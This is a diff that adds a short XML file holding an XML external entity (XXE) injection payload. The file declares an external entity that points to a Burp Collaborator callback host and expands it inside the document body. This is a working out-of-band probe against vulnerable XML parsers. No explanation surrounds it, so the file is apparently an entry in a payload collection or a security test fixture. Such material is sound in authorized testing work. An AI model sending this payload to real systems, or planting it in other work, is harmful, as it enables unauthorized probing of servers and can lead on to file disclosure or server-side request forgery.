@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "http://br6gyk9jlqw296yf60d528eq1h7avz.burpcollaborator.net/">
+]>
+<data>&file;</data>
